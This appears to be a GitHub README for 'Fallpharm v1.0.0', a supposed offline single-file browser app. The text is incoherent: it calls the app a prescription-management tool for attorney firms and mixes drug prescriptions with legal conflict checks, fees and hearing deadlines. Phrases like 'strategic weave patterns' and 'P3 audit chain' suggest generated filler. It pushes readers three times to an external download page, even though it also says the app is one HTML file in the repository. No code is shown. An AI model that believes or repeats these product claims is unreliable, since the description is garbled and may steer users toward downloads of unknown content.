# Fallpharm v1.0.0 - sovereign professional-service workflow tool 2026

> **A browser-native prescription management app for attorney-firm workflows, with offline operation, US law research support, conflict checking, and a local audit trail in version 1.0.0.**

[![Platform](https://img.shields.io/badge/Platform-browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ben-gray78/fallpharm-prescription-workflow-hub?style=flat-square)](https://github.com/ben-gray78/fallpharm-prescription-workflow-hub)

---

<p align="center">
  <a href="https://ben-gray78.github.io/fallpharm-prescription-workflow-hub/">
    <img src="https://img.shields.io/badge/Download-Fallpharm%20Latest-brightgreen?style=for-the-badge" alt="Download Fallpharm">
  </a>
</p>

> **[Direct Download - Fallpharm v1.0.0](https://ben-gray78.github.io/fallpharm-prescription-workflow-hub/)**

---

[Download Latest Build](https://ben-gray78.github.io/fallpharm-prescription-workflow-hub/)

---

## Overview

Fallpharm is a one-file browser application for prescription management and adjacent professional-service tasks. It is built to operate offline, retain information locally, and give teams a self-contained workspace without any server-side deployment.

The app is centered on attorney-firm scenarios, including US law research support, conflict checks, and structured case handling. Because it is local-first, it is a practical choice when you want a compact browser tool that works without signup, telemetry, or external infrastructure.

---

## What it includes

- Single HTML file that loads and runs completely in the browser
- IndexedDB as the primary local store, with localStorage fallback available
- No server dependency, no telemetry, and no account creation flow
- Multi-prescription sidebar with search and filtering controls
- Detailed record tabs for overview, fees, conflict, timeline, advice, documents, and time
- Critical-date flags for limitation windows and hearing deadlines
- Local conflict scanning with BroadcastChannel sync across open sessions
- Advice issuance with sha256 signing and retention support
- P3 audit chain with exportable JSON output
- US law corpus support with strategic weave patterns for research context

---

## Installation

Fallpharm ships as a single HTML application. Grab the repository or clone it locally, then open the main HTML file in a browser that supports the needed storage and browser APIs.

1. Download the repository or copy the HTML file to your machine.
2. Open the app file directly in the browser, or host it as a static page if you prefer.
3. Allow the browser to use local storage features so the app can persist data.

Typical first launch is simply opening the HTML file; no separate build step is required.

---

## How to use it

After opening the app, use the sidebar to move through prescriptions, refine the list with search, and jump between records as needed.

Common workflow:
1. Create or load a prescription record.
2. Review the overview and fee details.
3. Check conflict status against local data.
4. Track timeline items and critical dates.
5. Record advice, documents, and time entries.
6. Export audit material when you need a portable JSON trace.

Because the app is local-first, your workflow stays within the browser session and the browser storage it can access.

---

## Configuration notes

Most settings are stored in browser storage rather than a separate config file. The app persists data automatically, so setup usually comes down to standard browser permission and storage behavior.

If you need to reset data, clear the site storage for the page or remove the local browser entries used by the application. When IndexedDB is not available, the app can fall back to localStorage.

---

## Requirements

- A modern browser with support for HTML, IndexedDB, and BroadcastChannel
- Local storage access for persistence and fallback behavior
- Enough browser storage for prescriptions, documents, and audit history
- No backend service or external database required

---

## FAQ

**Does Fallpharm require a server?**  
No. It is designed to run as a single-file browser app with local storage.

**How are updates handled?**  
Download the latest build from the repository landing page and replace your local copy as needed.

**Where is the data stored?**  
Primary storage uses IndexedDB, with localStorage used as a fallback when needed.

**Can I move data between machines?**  
Yes. Use the exportable JSON audit chain and any other app-provided export workflow to transfer records.

**What if conflict checks do not match expectations?**  
Review the local dataset, refresh the browser session, and confirm that all relevant records are loaded into the same storage scope.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
